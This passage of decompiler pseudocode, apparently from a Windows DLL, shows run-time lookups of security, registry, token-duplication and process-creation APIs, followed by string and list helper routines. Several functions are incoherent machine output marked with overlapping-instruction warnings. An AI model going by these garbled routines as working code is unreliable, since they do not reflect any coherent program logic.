  DAT_100990e8 = (*unaff_ESI)(DAT_100990d8,"EqualSid");
  DAT_100990ec = (*unaff_ESI)(DAT_100990d8,"FreeSid");
  DAT_100990f0 = (*unaff_ESI)(DAT_100990d8,"SetEntriesInAclW");
  DAT_100990f4 = (*unaff_ESI)(DAT_100990d8,"InitializeSecurityDescriptor");
  DAT_100990f8 = (*unaff_ESI)(DAT_100990d8,"SetSecurityDescriptorDacl");
  DAT_100990fc = (*unaff_ESI)(DAT_100990d8,"SetFileSecurityW");
  DAT_10099100 = (*unaff_ESI)(DAT_100990d8,"RegCreateKeyExW");
  _DAT_10099104 = (*unaff_ESI)(DAT_100990d8,"RegOpenKeyExW");
  _DAT_10099108 = (*unaff_ESI)(DAT_100990d8,"RegSetKeySecurity");
  DAT_1009910c = (*unaff_ESI)(DAT_100990d8,"RegCloseKey");
  _DAT_10099110 = (*unaff_ESI)(DAT_100990d8,"RegDeleteKeyW");
  DAT_10099118 = (*unaff_ESI)(DAT_100990d8,"GetLengthSid");
  DAT_1009911c = (*unaff_ESI)(DAT_100990d8,"CopySid");
  DAT_10099120 = (*unaff_ESI)(DAT_100990d8,"GetTokenInformation");
  DAT_10099124 = (*unaff_ESI)(DAT_100990d8,"RegSetValueExW");
  DAT_10099128 = (*unaff_ESI)(DAT_100990d8,"RegOpenKeyW");
  _DAT_1009912c = (*unaff_ESI)(DAT_100990d8,"RegQueryValueExW");
  DAT_10099130 = (*unaff_ESI)(DAT_100990d8,"ReportEventW");
  DAT_10099134 = (*unaff_ESI)(DAT_100990d8,"RegisterEventSourceW");
  DAT_10099138 = (*unaff_ESI)(DAT_100990d8,"DeregisterEventSource");
  DAT_1009913c = (*unaff_ESI)(DAT_100990d8,"CheckTokenMembership");
  _DAT_10099140 = (*unaff_ESI)(DAT_100990d8,"RegEnumKeyExW");
  _DAT_10099144 = (*unaff_ESI)(DAT_100990d8,"RegDeleteValueW");
  _DAT_10099148 = (*unaff_ESI)(DAT_100990d8,"RegQueryInfoKeyW");
  DAT_1009914c = (*unaff_ESI)(DAT_100990d8,"DuplicateTokenEx");
  DAT_10099150 = (*unaff_ESI)(DAT_100990d8,"CreateProcessAsUserW");
  DAT_10099154 = (*unaff_ESI)(DAT_100990d8,"ConvertStringSecurityDescriptorToSecurityDescriptorW");
  return &DAT_100990d8;
}



/* Function: FUN_10006850 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined * FUN_10006850(void)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10073eae;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((DAT_1009b244 & 1) == 0) {
    DAT_1009b244 = DAT_1009b244 | 1;
    local_8 = 0;
    _DAT_1009b248 = 0x114;
    if ((DAT_1009b4dc & 1) == 0) {
      DAT_1009b4dc = DAT_1009b4dc | 1;
      FUN_1001a9a0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
      FUN_10057b51(&DAT_100784c0);
    }
    (*DAT_1009b50c)(&DAT_1009b248);
  }
  ExceptionList = local_10;
  return &DAT_1009b248;
}



/* Function: FUN_100068e0 */

undefined * __fastcall FUN_100068e0(undefined4 param_1)

{
  byte *pbVar1;
  code *pcVar2;
  int iVar3;
  undefined *puVar4;
  int unaff_EBX;
  int unaff_EBP;
  int unaff_EDI;
  undefined1 in_ZF;
  
  iVar3 = FUN_103593fd(param_1);
  if ((bool)in_ZF) {
    pcVar2 = (code *)swi(3);
    puVar4 = (undefined *)(*pcVar2)();
    return puVar4;
  }
  pbVar1 = (byte *)(unaff_EDI + 0x129de810 + iVar3);
  *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
  *(char *)(unaff_EBX + 0x486804c4) = *(char *)(unaff_EBX + 0x486804c4) + (char)iVar3;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return &DAT_1009b248;
}



/* Function: FUN_100068f0 */

undefined4 * __fastcall FUN_100068f0(undefined4 param_1)

{
  uint uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10073ede;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_1009b35c & 1) == 0) {
    DAT_1009b35c = DAT_1009b35c | 1;
    local_8 = 0;
    FUN_10006ca0(param_1);
    FUN_10057b51(FUN_100781b0,uVar1);
  }
  ExceptionList = local_10;
  return &DAT_1009b360;
}



/* Function: FUN_10006960 */

void __fastcall FUN_10006960(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 8);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_10006980 */

void __fastcall FUN_10006980(int param_1)

{
  int iVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  byte bVar6;
  char cVar7;
  char *pcVar8;
  int extraout_ECX;
  int unaff_EBX;
  undefined4 *unaff_ESI;
  undefined8 uVar9;
  int iStack0000000d;
  undefined1 local_23 [8];
  undefined4 uStack_1b;
  undefined3 uStack_17;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 uStack_8;
  
  uStack_8 = 0xffffffff;
  puStack_c = &LAB_10073f40;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar1 = param_1 + 8;
  uStack_1b._3_1_ = (undefined1)iVar1;
  uStack_17 = (undefined3)((uint)iVar1 >> 8);
  local_14 = param_1;
  pcVar8 = (char *)FUN_105ce196(iVar1,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  puVar2 = (uint *)(unaff_EBX + 0x1b91075);
  bVar6 = (byte)extraout_ECX & 0x1f;
  *puVar2 = *puVar2 >> bVar6 | *puVar2 << 0x20 - bVar6;
  cVar7 = (char)pcVar8;
  *pcVar8 = *pcVar8 + cVar7;
  *pcVar8 = *pcVar8 + cVar7;
  *pcVar8 = *pcVar8 + cVar7;
  piVar4 = (int *)*unaff_ESI;
  uStack_1b = piVar4;
  if (piVar4 != (int *)0x0) {
    LOCK();
    *piVar4 = *piVar4 + extraout_ECX;
    UNLOCK();
    LOCK();
    *piVar4 = *piVar4 + extraout_ECX;
    UNLOCK();
    LOCK();
    iVar3 = *piVar4;
    *piVar4 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  uStack_8._0_2_ = CONCAT11(1,(undefined1)uStack_8);
  iVar3 = *(int *)CONCAT13(local_10._0_1_,local_14._1_3_);
  iStack0000000d = FUN_10007570(iVar3,*(undefined4 *)(iVar3 + 4),local_23);
  iVar5 = *(int *)(CONCAT13(local_10._0_1_,local_14._1_3_) + 4);
  uVar9 = CONCAT44(CONCAT13(local_10._0_1_,local_14._1_3_),iVar5);
  if (iVar5 == 0xccccccb) {
    uVar9 = FUN_10056a6a("list<T> too long");
  }
  *(int *)((int)((ulonglong)uVar9 >> 0x20) + 4) = (int)uVar9 + 1;
  *(int *)(iVar3 + 4) = iStack0000000d;
  **(int **)(iStack0000000d + 4) = iStack0000000d;
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar4;
    *piVar4 = *piVar4 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  (*DAT_100792fc)(iVar1);
  ExceptionList = (void *)CONCAT13(puStack_c._0_1_,local_10._1_3_);
  return;
}



/* Function: FUN_10006a80 */

/* WARNING: Instruction at (ram,0x10006bac) overlaps instruction at (ram,0x10006bab)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __fastcall FUN_10006a80(int *param_1)

{
  int *piVar1;
  int *piVar2;
  undefined4 *puVar3;
  code *pcVar4;
  code *pcVar5;
  uint uVar6;
  int iVar7;
  int *piVar8;
  undefined4 *puVar9;
  int *piVar10;
  int *local_20;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_10 = ExceptionList;
  local_8 = 0xffffffff;
  puStack_c = &LAB_10073f70;
  pcVar5 = (code *)(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  ExceptionList = &local_10;
  if (DAT_10099180 != (undefined4 *)0x0) {
    *DAT_10099180 = 1;
  }
  pcVar4 = DAT_10079310;
  LOCK();
  UNLOCK();
  while (1 < DAT_10099184 + 1) {
    LOCK();
    UNLOCK();
    (*pcVar4)(1);
    LOCK();
    UNLOCK();
  }
  DAT_10099184 = DAT_10099184 + 1;
  uVar6 = FUN_10395086();
  if ((uVar6 & 1) == 0) {
    DAT_1009b380 = uVar6 | 1;
    _DAT_1009b384 = (*pcVar5)();
  }
  _DAT_1009b384 = (*pcVar5)();
  piVar8 = (int *)0xd05;
  if (_DAT_1009b384 != 0) {
    piVar8 = (int *)0xffffffff;
  }
  LOCK();
  DAT_10099184 = DAT_10099184 + -1;
  UNLOCK();
  local_20 = (int *)0x0;
  puVar9 = (undefined4 *)0x0;
  local_8 = 0;
  piVar1 = param_1 + 2;
  FUN_103dd079(param_1,piVar1);
  piVar10 = *(int **)*param_1;
  if (piVar10 != (int *)*param_1) {
    puVar9 = (undefined4 *)piVar10[3];
    local_20 = (int *)FUN_10007010(piVar10[4]);
  }
  (*DAT_100792fc)(piVar1);
  do {
    if ((((puVar9 == (undefined4 *)0x0) || (iVar7 = FUN_104d4ad0(piVar1), iVar7 == puVar9[3])) ||
        (piVar10 = piVar8, iVar7 = FUN_100ee1fb(puVar9[5],piVar8), iVar7 == 0)) || (iVar7 == 0x102))
    {
      piVar10 = piVar1;
    }
    FUN_10491aab(piVar10);
    FUN_10344be4(piVar1);
    local_8 = CONCAT31(local_8._1_3_,1);
    for (piVar10 = *(int **)*param_1; piVar10 != (int *)*param_1; piVar10 = (int *)*piVar10) {
      if (puVar9 == (undefined4 *)piVar10[3]) {
        piVar10[3] = 0;
        if (puVar9 != (undefined4 *)0x0) {
          (**(code **)*puVar9)(1);
        }
        *(int *)piVar10[1] = *piVar10;
        *(int *)(*piVar10 + 4) = piVar10[1];
        param_1[1] = param_1[1] + -1;
        piVar2 = (int *)piVar10[4];
        if (piVar2 != (int *)0x0) {
          LOCK();
          iVar7 = *piVar2;
          *piVar2 = iVar7 + -1;
          UNLOCK();
          if (iVar7 + -1 < 0) {
            FUN_100579ee(piVar2);
          }
        }
        thunk_FUN_100579ee(piVar10);
        break;
      }
    }
    puVar3 = *(undefined4 **)*param_1;
    while( true ) {
      if (puVar3 == (undefined4 *)*param_1) goto LAB_10006c3c;
      if (puVar3[3] != 0) break;
      puVar3 = (undefined4 *)*puVar3;
    }
    puVar9 = (undefined4 *)puVar3[3];
    local_20 = (int *)FUN_10007010(puVar3[4]);
    if (puVar9 == (undefined4 *)0x0) {
LAB_10006c3c:
      (*DAT_100792fc)(piVar1);
      if (local_20 != (int *)0x0) {
        LOCK();
        iVar7 = *local_20;
        *local_20 = *local_20 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(local_20);
        }
      }
      ExceptionList = local_10;
      return;
    }
    (*DAT_100792fc)(piVar1);
  } while( true );
}



/* Function: FUN_10006ca0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * FUN_10006ca0(undefined4 param_1)

{
  undefined1 uVar1;
  uint uVar2;
  undefined1 *unaff_EDI;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10073f95;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  DAT_1009b360 = 0;
  _DAT_1009b364 = 0;
  DAT_1009b360 = FUN_10006fd0(0,0);
  local_8 = 0;
  uVar1 = FUN_10311114(&DAT_1009b368,uVar2);
  *unaff_EDI = uVar1;
  if ((PTR_DAT_10096f20 != (undefined *)0x0) &&
     (*(code **)(PTR_DAT_10096f20 + 0x178) != (code *)0x0)) {
    (**(code **)(PTR_DAT_10096f20 + 0x178))(&DAT_1009b368,4000);
  }
  DAT_10099180 = param_1;
  FUN_1004a5d0();
  ExceptionList = local_10;
  return &DAT_1009b360;
}



/* Function: FUN_10006d50 */

undefined4 FUN_10006d50(void)

{
  char *pcVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int unaff_EBX;
  int iVar6;
  int unaff_EDI;
  char cVar7;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10073fbe;
  local_10 = ExceptionList;
  cVar7 = '\0';
  ExceptionList = &local_10;
  FUN_103109bd(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  pcVar1 = (char *)(unaff_EBX + 0x1c1f6f8);
  *pcVar1 = *pcVar1 + (char)*(undefined6 *)(unaff_EBX + 0x9b35c0d) + cVar7;
  if (*pcVar1 == '\0') {
    DAT_1009b35c = (uint)*(undefined6 *)(unaff_EBX + 0x9b35c0d) | 1;
    local_8 = 0;
    FUN_10006ca0(0);
    FUN_10057b51(FUN_100781b0);
  }
  FUN_1017adb3();
  iVar6 = 0;
  iVar3 = FUN_105c00a0();
  pcVar2 = DAT_100792fc;
  while (iVar4 = FUN_104cc250(pcVar2), (uint)(iVar4 - iVar3) < 0x3e9) {
    piVar5 = (int *)*DAT_1009b360;
    if (piVar5 != DAT_1009b360) {
      do {
        if (unaff_EDI == piVar5[2]) {
          iVar6 = iVar6 + 1;
        }
        piVar5 = (int *)*piVar5;
      } while (piVar5 != DAT_1009b360);
      if (iVar6 != 0) break;
    }
    (*pcVar2)(&DAT_1009b368);
    (*DAT_10079310)(1);
    FUN_103cf5f2();
  }
  (*pcVar2)(&DAT_1009b368);
  ExceptionList = local_10;
  return 1;
}



/* Function: FUN_10006e40 */

void FUN_10006e40(void)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10073fe8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar3 = FUN_100d6d58(ExceptionList,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  piVar4 = (int *)FUN_100068f0();
  FUN_102129a3(piVar4 + 2);
  local_8 = 0;
  piVar1 = *(int **)*piVar4;
  do {
    if (piVar1 == (int *)*piVar4) {
LAB_10006ef0:
      (*DAT_100792fc)(piVar4 + 2);
      ExceptionList = local_10;
      return;
    }
    if (iVar3 == piVar1[2]) {
      if ((undefined4 *)piVar1[3] != (undefined4 *)0x0) {
        (*(code *)**(undefined4 **)piVar1[3])(1);
      }
      piVar1[3] = 0;
      *(int *)piVar1[1] = *piVar1;
      *(int *)(*piVar1 + 4) = piVar1[1];
      piVar4[1] = piVar4[1] + -1;
      piVar2 = (int *)piVar1[4];
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar2;
        *piVar2 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      thunk_FUN_100579ee(piVar1);
      goto LAB_10006ef0;
    }
    piVar1 = (int *)*piVar1;
  } while( true );
}



/* Function: FUN_10006f10 */

void FUN_10006f10(void)

{
  FUN_10006f60();
  thunk_FUN_100579ee(DAT_1009b360);
  return;
}



/* Function: FUN_10006f30 */

void __fastcall FUN_10006f30(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_10006f50 */

int __fastcall FUN_10006f50(int *param_1)

{
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_10006f60 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10006f60(void)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  
  piVar4 = (int *)*DAT_1009b360;
  *DAT_1009b360 = (int)DAT_1009b360;
  DAT_1009b360[1] = (int)DAT_1009b360;
  _DAT_1009b364 = 0;
  if (piVar4 != DAT_1009b360) {
    do {
      piVar2 = (int *)piVar4[4];
      piVar3 = (int *)*piVar4;
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar2;
        *piVar2 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      thunk_FUN_100579ee(piVar4);
      piVar4 = piVar3;
    } while (piVar3 != DAT_1009b360);
  }
  return;
}



/* Function: FUN_10006fc0 */

undefined4 __fastcall FUN_10006fc0(undefined4 param_1)

{
  return param_1;
}



/* Function: FUN_10006fd0 */

void FUN_10006fd0(int *param_1,int *param_2)

{
  code *pcVar1;
  int *piVar2;
  
  piVar2 = (int *)FUN_100582fa(0x14);
  if (piVar2 == (int *)0x0) {
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = piVar2;
    param_2 = piVar2;
  }
  *piVar2 = (int)param_1;
  if (piVar2 + 1 != (int *)0x0) {
    piVar2[1] = (int)param_2;
  }
  return;
}



/* Function: FUN_10007010 */

int * __thiscall FUN_10007010(int *param_1,int *param_2)

{
  int iVar1;
  
  if (param_2 != param_1) {
    if ((param_2 == (int *)0x0) || (param_2[2] == 0)) {
      if (param_1 != (int *)0x0) {
        if (*param_1 == 0) {
          param_1[2] = 0;
          *(undefined1 *)(param_1 + 3) = 0;
          return param_1;
        }
        LOCK();
        iVar1 = *param_1;
        *param_1 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(param_1);
        }
      }
      return (int *)0x0;
    }
    if ((((param_1 == (int *)0x0) || (*param_1 == 0)) && (param_1 != (int *)0x0)) &&
       ((uint)param_2[2] < param_1[1] - 1U)) {
      FUN_1005d740(param_1 + 3,param_2 + 3,param_2[2] + 1);
      param_1[2] = param_2[2];
      return param_1;
    }
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
    if (param_1 != (int *)0x0) {
      LOCK();
      iVar1 = *param_1;
      *param_1 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_1);
      }
    }
  }
  return param_2;
}



/* Function: FUN_100070d0 */

int * __thiscall FUN_100070d0(int *param_1,int *param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int local_c;
  char local_5;
  
  if (((param_1 == (int *)0x0) || (param_2 < param_1 + 3)) ||
     ((int *)(param_1[1] + 0xc + (int)param_1) <= param_2)) {
    local_5 = '\0';
  }
  else {
    local_5 = '\x01';
  }
  if (param_3 == -1) {
    if (param_2 == (int *)0x0) {
      param_3 = 0;
    }
    else {
      piVar2 = param_2;
      do {
        iVar5 = *piVar2;
        piVar2 = (int *)((int)piVar2 + 1);
      } while ((char)iVar5 != '\0');
      param_3 = (int)piVar2 - ((int)param_2 + 1);
    }
  }
  iVar5 = param_3;
  if (((param_1 == (int *)0x0) || (*param_1 == 0)) && (param_3 != 0)) {
    if (local_5 != '\0') {
      local_c = (int)param_2 + (-0xc - (int)param_1);
      FUN_10007380(&local_c,&param_3);
      iVar5 = param_3;
      if (param_3 != 0) {
        FUN_10057b70(param_1 + 3,param_2,param_3);
      }
      param_1[2] = iVar5;
      *(undefined1 *)(iVar5 + 0xc + (int)param_1) = 0;
      return param_1;
    }
  }
  else if ((local_5 != '\0') && (param_1 != (int *)0x0)) {
    LOCK();
    *param_1 = *param_1 + 1;
    UNLOCK();
  }
  if (param_3 == 0) {
    uVar3 = 0;
  }
  else {
    uVar3 = param_3 + 1;
  }
  if ((param_1 == (int *)0x0) || (*param_1 == 0)) {
    piVar2 = (int *)FUN_100073c0(uVar3);
  }
  else {
    if (uVar3 < 0x10000) {
      uVar4 = 0x10;
      if (0x10 < uVar3) {
        uVar4 = uVar3;
      }
      uVar3 = uVar4 + 0xf & 0xfffffff0;
    }
    else {
      uVar3 = uVar3 + 0xffff & 0xffff0000;
    }
    piVar2 = (int *)FUN_100581b4(uVar3 + 0xf);
    iVar5 = param_3;
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar3;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined1 *)(piVar2 + 3) = 0;
      LOCK();
      iVar1 = *param_1;
      *param_1 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_1);
        iVar5 = param_3;
      }
    }
  }
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      LOCK();
      iVar5 = *param_1;
      *param_1 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(param_1);
      }
    }
  }
  else if (iVar5 == 0) {
    piVar2[2] = 0;
    *(undefined1 *)(piVar2[2] + 0xc + (int)piVar2) = 0;
  }
  else {
    piVar2[2] = iVar5;
    FUN_1005d740(piVar2 + 3,param_2,iVar5);
    *(undefined1 *)(piVar2[2] + 0xc + (int)piVar2) = 0;
  }
  if ((local_5 != '\0') && (param_1 != (int *)0x0)) {
    LOCK();
    iVar5 = *param_1;
    *param_1 = *param_1 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  return piVar2;
}



/* Function: FUN_10007280 */

int * __fastcall FUN_10007280(int *param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_10007301:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004bad0(0);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_100074a0(param_1[2] + iVar1,1);
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_100072c6;
    }
    if (param_1 == (int *)0x0) goto LAB_10007301;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004bad0(uVar4);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_100073c0(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined1 *)(param_1[2] + 0xc + (int)param_1) = 0;
    }
    return param_1;
  }
LAB_100072c6:
  iVar1 = FUN_1004bad0(piVar2[1] - piVar2[2]);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_10007360 */

void __fastcall FUN_10007360(undefined4 *param_1)

{
  (*DAT_100792fc)(*param_1);
  return;
}



/* Function: FUN_10007370 */

void FUN_10007370(void)

{
  return;
}



/* Function: FUN_10007380 */

void __thiscall FUN_10007380(int param_1,uint *param_2,int *param_3)

{
  uint uVar1;
  uint uVar2;
  
  if (param_1 != 0) {
    uVar1 = *param_2;
    uVar2 = *(uint *)(param_1 + 8);
    if (uVar1 <= uVar2) {
      if ((*param_3 == -1) || (uVar2 < *param_3 + uVar1)) {
        *param_3 = uVar2 - uVar1;
      }
      return;
    }
  }
  *param_2 = 0;
  *param_3 = 0;
  return;
}



/* Function: FUN_100073c0 */

int * __thiscall FUN_100073c0(int *param_1,uint param_2)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
    if (((param_2 != 0) && (param_2 != 0)) && (param_2 != 1)) {
      uVar3 = 0x10;
      if (0x10 < param_2) {
        uVar3 = param_2;
      }
      uVar3 = uVar3 + 0xf & 0xfffffff0;
      piVar2 = (int *)FUN_100581b4(uVar3 + 0xf);
      if (piVar2 != (int *)0x0) {
        piVar2[1] = uVar3;
        *piVar2 = 0;
        piVar2[2] = 0;
        *(undefined1 *)(piVar2 + 3) = 0;
        return piVar2;
      }
    }
    return (int *)0x0;
  }
  uVar3 = param_1[1];
  piVar2 = param_1;
  if (uVar3 < param_2) {
    if (param_2 < 0x10000) {
      if (uVar3 < 0x8000) {
        uVar4 = 1;
        if (uVar3 != 0) {
          uVar4 = uVar3;
        }
        do {
          uVar4 = uVar4 * 2;
        } while (uVar4 < param_2);
      }
      else {
        uVar4 = 0x10000;
      }
    }
    else {
      uVar4 = param_2 + 0xffff & 0xffff0000;
    }
    piVar2 = (int *)FUN_10058246(param_1,uVar4 + 0xf);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      return piVar2;
    }
    LOCK();
    iVar1 = *param_1;
    *param_1 = iVar1 + -1;
    UNLOCK();
    piVar2 = (int *)0x0;
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_1);
      return (int *)0x0;
    }
  }
  return piVar2;
}



/* Function: FUN_100074a0 */

undefined4 * __thiscall FUN_100074a0(int *param_1,uint param_2,char param_3)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  
  if ((param_1 != (int *)0x0) && (*param_1 != 0)) {
    if ((param_3 != '\0') && (param_2 < param_1[2] + 1U)) {
      param_2 = param_1[2] + 1U;
    }
    if (param_2 < 0x10000) {
      uVar3 = 0x10;
      if (0x10 < param_2) {
        uVar3 = param_2;
      }
      uVar3 = uVar3 + 0xf & 0xfffffff0;
    }
    else {
      uVar3 = param_2 + 0xffff & 0xffff0000;
    }
    puVar2 = (undefined4 *)FUN_100581b4(uVar3 + 0xf);
    if (puVar2 != (undefined4 *)0x0) {
      puVar2[1] = uVar3;
      *puVar2 = 0;
      if (param_3 == '\0') {
        puVar2[2] = 0;
        *(undefined1 *)(puVar2 + 3) = 0;
      }
      else {
        puVar2[2] = param_1[2];
        FUN_1005d740(puVar2 + 3,param_1 + 3,param_1[2] + 1);
      }
      LOCK();
      iVar1 = *param_1;
      *param_1 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_1);
      }
    }
    return puVar2;
  }
  puVar2 = (undefined4 *)FUN_100073c0(param_2);
  return puVar2;
}



/* Function: FUN_10007570 */

int FUN_10007570(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = FUN_10006fd0(param_1,param_2);
  if ((undefined4 *)(iVar2 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar2 + 8) = *param_3;
    *(undefined4 *)(iVar2 + 0xc) = param_3[1];
    piVar1 = (int *)param_3[2];
    *(int **)(iVar2 + 0x10) = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
  }
  return iVar2;
}



/* Function: FUN_100075b0 */

undefined4 * __fastcall FUN_100075b0(char *param_1,int param_2)

{
  char cVar1;
  uint uVar2;
  undefined4 *puVar3;
  char *pcVar4;
  
  if (param_2 == -1) {
    if (param_1 == (char *)0x0) {
      return (undefined4 *)0x0;
    }
    pcVar4 = param_1;
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    param_2 = (int)pcVar4 - (int)(param_1 + 1);
  }
  if (param_2 == 0) {
    return (undefined4 *)0x0;
  }
  uVar2 = 0x10;
  if (0x10 < param_2 + 1U) {
    uVar2 = param_2 + 1U;
  }
  uVar2 = uVar2 + 0xf & 0xfffffff0;
  puVar3 = (undefined4 *)FUN_100581b4(uVar2 + 0xf);
  if (puVar3 != (undefined4 *)0x0) {
    puVar3[1] = uVar2;
    *puVar3 = 0;
    if (param_1 == (char *)0x0) {
      puVar3[2] = 0;
      *(undefined1 *)((int)puVar3 + puVar3[2] + 0xc) = 0;
      return puVar3;
    }
    puVar3[2] = param_2;
    FUN_1005d740(puVar3 + 3,param_1,param_2);
    *(undefined1 *)((int)puVar3 + puVar3[2] + 0xc) = 0;
    return puVar3;
  }
  return (undefined4 *)0x0;
}



/* Function: FUN_10007660 */

undefined4 * __thiscall FUN_10007660(undefined4 *param_1,byte param_2)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007401b;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = CRobotBase::vftable;
  local_8 = 0;
  FUN_100079a0(uVar3);
  piVar2 = (int *)param_1[5];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_100076e0 */

void FUN_100076e0(int *param_1)

{
  if (param_1 != (int *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x100076ed. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (**(code **)(*param_1 + 0xc))();
    return;
  }
  return;
}



/* Function: FUN_10007700 */

void __fastcall FUN_10007700(int param_1)

{
  int iVar1;
  int *local_1c;
  undefined1 local_18 [8];
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074056;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((DAT_1009b388 & 1) == 0) {
    DAT_1009b388 = DAT_1009b388 | 1;
    local_8 = 0;
